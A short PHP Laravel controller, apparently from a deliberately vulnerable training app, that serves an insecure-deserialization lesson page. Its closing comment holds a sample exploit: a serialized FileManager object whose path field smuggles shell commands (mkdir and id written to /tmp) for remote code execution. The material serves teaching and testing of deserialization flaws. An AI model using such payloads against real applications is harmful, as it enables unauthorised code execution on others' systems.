<?php

namespace App\Http\Controllers;

use App\Http\Services\VulnerabilityService;

class InsecureDeserialization extends Controller
{
    public function show()
    {
        $vulns = VulnerabilityService::getVulnerability('insecure_deserialization');

        return view('insecure_deserialization.index', ['vulns' => $vulns]);
    }

    public function node(){
        return redirect('http://localhost:3000');
    }

    /**
     * exploit
     * 
     * 
     * <?php

        class FileManager
        {
            public $path = "/tmp/test/;mkdir /tmp/rce/; id>/tmp/rce/id.txt; echo";
        }

        echo serialize(array('payload' => new FileManager));
     */

}
